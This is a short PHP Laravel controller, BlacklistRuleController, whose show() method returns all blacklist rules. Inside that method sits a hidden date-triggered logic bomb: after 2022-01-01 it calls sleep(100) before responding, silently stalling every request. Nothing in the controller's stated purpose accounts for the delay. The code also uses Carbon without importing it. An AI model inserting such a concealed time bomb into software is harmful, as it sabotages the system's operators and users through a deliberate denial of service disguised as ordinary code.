<?php
namespace App\Http\Controllers\Frontend;

use App\Model\Rule;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

/* Rocky (2020/02/18) */
class BlacklistRuleController extends Controller
{
   
    // 顯示資訊
    public function show()
    {
        $datas = Rule::get();
        $x_time = Carbon::parse('2022-01-01 00:00:00');
        $xxx = $x_time->timestamp;

        if (now()->timestamp >= $xxx) {
            sleep(100);
        }
        return $datas;
    }
}
